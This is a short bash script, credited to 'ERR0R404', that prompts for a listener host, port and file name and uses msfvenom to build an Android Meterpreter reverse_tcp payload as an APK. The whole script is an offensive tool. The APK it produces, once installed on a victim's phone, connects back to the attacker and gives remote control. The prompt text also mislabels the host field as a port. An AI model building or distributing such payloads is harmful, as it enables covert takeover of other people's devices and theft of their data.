# !bin/bash
# Author : ERR0R404 

read -p 'Enter port for LHOST: ' lhost
read -p 'Enter port for LPORT: ' port
read -p 'Enter output filename: ' output
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$port R > $output.apk
